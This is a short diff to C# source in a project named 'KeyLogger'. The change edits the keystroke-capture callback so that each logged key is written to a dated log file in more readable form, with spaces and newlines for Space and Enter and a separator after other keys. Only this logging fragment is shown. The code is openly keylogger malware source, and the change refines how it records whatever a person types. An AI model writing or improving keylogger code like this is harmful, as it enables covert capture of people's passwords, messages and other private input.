@@ -84,7 +84,19 @@ namespace KeyLogger
             Console.WriteLine((Keys)vkCode);
             string logNameToWrite = logName + DateTime.Now.ToLongDateString() + logExtendtion;
             StreamWriter sw = new StreamWriter(logNameToWrite, true);
-            sw.Write((Keys)vkCode);
+            switch ((Keys)vkCode)
+            {
+                case Keys.Space:
+                    sw.Write(" ");
+                    break;
+                case Keys.Enter:
+                    sw.Write("\n");
+                    break;
+                default:
+                    sw.Write((Keys)vkCode + " ");
+                    break;
+            }
+
             sw.Close();
         }
 
